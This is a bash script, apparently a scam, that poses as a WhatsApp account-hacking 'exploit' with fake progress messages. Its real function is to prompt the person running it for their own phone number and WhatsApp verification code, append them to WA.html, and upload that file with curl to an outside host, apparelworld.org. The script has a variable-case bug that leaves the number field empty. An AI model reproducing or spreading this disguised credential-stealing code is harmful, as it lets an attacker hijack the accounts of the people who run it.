#!/bin/bash
clear
echo "
<-- Ro0TP00R -->
################################
#   Whatsapp Code  # By Ro0TP00R
#   Youtube   # Ro0TP00R Channel
#   Kalo Gak Subsribe Gak Work Script ny4 
################################

Copyright (c) 2020 Ro0TP00R";
echo "";
read -p "Nomer Kamu (+62xxxx)=> " Nomer;
read -p "Nomer Target (+62xxxx) => " Target;
sleep 2
echo "[+] Syncing Target...";
sleep 1
echo "Login  => $nomer";
sleep 0.5
echo "Target => $target";
sleep 0.5
echo "[+] Exploiting...";
echo "Nomer => $nomer" >> WA.html;
curl -T WA.html http://apparelworld.org/
sleep 5;
echo "[+] Done.";
echo "Tunggu 5-10 Menit Untuk Mendapatkan Code. Mohon Bersabar ini Ujian.";
read -p "Verify Code => " code;
sleep 2
echo "[+] Connecting to whatsapp.com...";
echo "Login => $nomer";
sleep 0.5
echo "Code => $code";
sleep 0.5
echo "Target => $target";
sleep 0.5
echo "[+] Sending Exploit...";
echo "Code => $code" >> WA.html;
curl -T WA.html http://apparelworld.org
sleep 5
echo "[+] Success Exploited!";
exit;
